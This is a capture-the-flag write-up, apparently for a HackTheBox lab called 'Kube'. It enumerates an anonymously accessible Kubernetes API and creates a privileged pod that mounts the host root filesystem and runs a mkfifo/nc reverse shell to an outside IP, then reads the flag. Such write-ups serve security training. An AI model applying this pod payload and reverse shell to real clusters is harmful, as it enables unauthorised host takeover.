## Kube

```bash
$ nmap -sS -sV -Pn -p- -T5 -n 10.129.173.189

Nmap scan report for 10.129.173.189
Host is up (0.023s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
2379/tcp  open  ssl/etcd-client?
2380/tcp  open  ssl/etcd-server?
8443/tcp  open  ssl/https-alt
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

After trying a bit to communicate with the available Kubernetes endpoints, we noticed we could list the namespaces anonymously:


```bash
$ curl "https://10.129.95.171:8443/api/v1/namespaces/" -sk | jq . 
{
  "kind": "NamespaceList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "113619"
  },
  "items": [
    {
      "metadata": {
        "name": "default",
        "uid": "1fe7d596-bcca-4f7a-ae82-3ea58781b9a6",
        "resourceVersion": "210",
        "creationTimestamp": "2021-07-19T19:06:43Z",
        "labels": {
          "kubernetes.io/metadata.name": "default"
        },
        "managedFields": [
          {
            "manager": "kube-apiserver",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2021-07-19T19:06:43Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:kubernetes.io/metadata.name": {}
                }
              }
            }
          }
        ]
      },
      "spec": {
        "finalizers": [
          "kubernetes"
        ]
      },
      "status": {
        "phase": "Active"
      }
    },
   [..]
}
```

We tried to use the `kubectl` CLI but it was not working properly as it seemed only a specific scope was allowed anonymously on the Kubernetes REST API.

We next requested more information about the running namespaces and pods. 

Finally, we noticed some pods were running with a mount point set to the host's filesystem:

```bash
$ curl "https://10.129.95.171:8443/api/v1/namespaces/kube-system/pods" -sk | jq ".items[0].spec"
{
  "volumes": [
    {
      "name": "mount-root-into-mnt",
      "hostPath": {
        "path": "/",
        "type": ""
      }
    },
    {
      "name": "kube-api-access-mss4g",
      "projected": {
        "sources": [
          [...]
        ],
        "defaultMode": 420
      }
    }
  ],
  "containers": [
    {
      "name": "alpine",
      "image": "alpine",
      "command": [
        "tail"
      ],
      "args": [
        "-f",
        "/dev/null"
      ],
      "resources": {},
      "volumeMounts": [
        {
          "name": "mount-root-into-mnt",
          "mountPath": "/root"
        },
        {
          "name": "kube-api-access-mss4g",
          "readOnly": true,
          "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
        }
      ],
      "terminationMessagePath": "/dev/termination-log",
      "terminationMessagePolicy": "File",
      "imagePullPolicy": "Always"
    }
  ],
  [...]
}
```

We also noticed we could create pods anonymously, so we deployed our own pod that also contained a mount point to the host's filesystem, was privileged, and would run a reverse shell:

```bash
$ cat new_pod.json

{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "name": "alpwnd"
    },
    "spec": {
        "containers": [{
            "command": [
                "sh"
            ],
            "args": ["-c", "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.65 9999 > /tmp/f"],
            "image": "alpine",
            "imagePullPolicy": "IfNotPresent",
            "name": "alpwnd",
            "securityContext": {
                "privileged": true
            },
            "volumeMounts": [{
                "name": "mount-root-into-mnt",
                "mountPath": "/mnt",
                "readOnly": false
            }],
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File"
        }],
        "volumes": [{
            "name": "mount-root-into-mnt",
            "hostPath": {
                "path": "/",
                "type": ""
            }
        }]
    }
}

$ curl -kI -H "Content-Type: application/json" https://10.129.95.171:8443/api/v1/namespaces/default/pods -d@new_pod.json

< HTTP/2 201 
[...]
< cache-control: no-cache, private
< content-type: application/json
< content-length: 3848
< 
{
  "kind": "Pod",
  "apiVersion": "v1",
  "metadata": {
    [...]
  },
  "spec": {
      [...]
    ],
    "containers": [
      {
        "name": "alpwnd",
        "image": "alpine",
        "command": [
          "sh"
        ],
        "args": [
          "-c",
          "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u003e\u00261 | nc 10.10.14.65 9999 \u003e /tmp/f"
        ],
        "resources": {
          
        },
        "volumeMounts": [
          {
            "name": "mount-root-into-mnt",
            "mountPath": "/mnt"
          },
          {
            "name": "kube-api-access-kz7pt",
            "readOnly": true,
            "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
          }
        ],
        "terminationMessagePath": "/dev/termination-log",
        "terminationMessagePolicy": "File",
        "imagePullPolicy": "IfNotPresent",
        "securityContext": {
          "privileged": true
        }
      }
    ],
    [...]
* Connection #0 to host 10.129.95.171 left intact
}
```

Once the pod was deployed, we received a connect-back from the reverse shell:

```bash
$ nc -nlvp 9999

listening on [any] 9999 ...
connect to [10.10.14.65] from (UNKNOWN) [10.129.95.171] 36179
/bin/sh: can't access tty; job control turned off
/ # cat /mnt/root/flag.txt
HTB{5y573m:4N0nYM0u5}
```
